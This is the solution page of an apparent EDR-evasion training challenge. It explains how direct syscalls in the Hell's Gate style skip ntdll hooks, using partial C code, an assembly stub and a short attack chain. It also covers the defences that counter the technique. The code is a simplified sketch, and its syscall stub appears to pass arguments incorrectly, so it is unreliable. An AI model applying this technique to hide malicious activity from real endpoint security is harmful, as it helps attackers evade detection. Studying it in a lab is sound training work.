---
title: "Solution 23: Direct Syscalls"
difficulty: hard
category: "API Hook Evasion"
---

[Back to Challenge]({{ '/challenges/23-direct-syscalls/' | relative_url }})

## Overview

Direct syscalls bypass ntdll.dll entirely. Instead of calling `ntdll!NtAllocateVirtualMemory`, you execute the `syscall` instruction yourself with the correct syscall ID in EAX. This defeats both the static IAT check (Rule 7) and any userland hooks an EDR might place on ntdll.dll.

## Solution (Hell's Gate approach)

```c
// hellsgate.c - direct syscall via inline assembly (x64)
#include <windows.h>
#include <stdio.h>

// Read the syscall ID from the unhooked ntdll on disk
DWORD GetSyscallId(const char* funcName) {
    // Map ntdll from disk (unhooking technique)
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    // Parse PE exports to find the function
    // ... (PE parsing to locate funcName's code)
    // Read: mov eax, <syscall_id> at the start of the stub
    // The pattern is: 4C 8B D1 B8 XX XX 00 00
    // Where XX XX is the syscall ID

    // Simplified: hardcoded for demo (Windows 10 21H2)
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0x18; // NtAllocateVirtualMemory - varies by version!
}

// Actual direct syscall via assembly
extern NTSTATUS DirectSyscall(DWORD syscallId, ...);
// In a .asm file:
// DirectSyscall PROC
//   mov r10, rcx      ; syscall convention
//   mov eax, ecx      ; syscall ID from first arg
//   syscall
//   ret
// DirectSyscall ENDP
```

For a complete implementation, see [Hell's Gate by am0nsec](https://github.com/am0nsec/HellsGate) or use [SysWhispers](https://github.com/jthuraisamy/SysWhispers) to generate syscall stubs.

## Why It Works

The `syscall` instruction transitions directly from user-mode to kernel-mode, completely skipping the ntdll.dll code where EDRs place their hooks. The MostShittyEDR has no kernel-level monitoring for syscalls (no ETW-TI, no instrumentation callbacks), so the call is completely invisible.

**Attack chain:**
1. Read the clean ntdll.dll from disk (not the hooked in-memory copy)
2. Extract the syscall ID from the function's stub
3. Execute `syscall` directly with the ID in EAX
4. ntdll.dll is never called — no IAT entry, no hook trigger

## Real-World Context

Modern EDRs counter direct syscalls with:
- **ETW-TI (Threat Intelligence)**: Kernel-level telemetry that monitors syscalls regardless of how they're issued
- **Instrumentation callbacks**: `PsSetCreateProcessNotifyRoutineEx2` and similar
- **Stack frame analysis**: Detecting that the return address doesn't point into ntdll.dll
- **Kernel minifilters**: Intercepting operations at the kernel level

See the blog post [Hell's Gate, Heaven's Gate & Tartarus Gate](https://benjitrapp.github.io/attacks/2026-01-19-hells-heaven-tartarus-gate/) for a deep dive.

## How to Verify

1. Start the EDR: `.\edr_agent.exe --profile crowdstrike --verbose --no-kill`
2. Run a direct-syscall PoC — should show `[OK]`, no detection at all
3. The memory allocation succeeds despite `NtAllocateVirtualMemory` being "hooked"
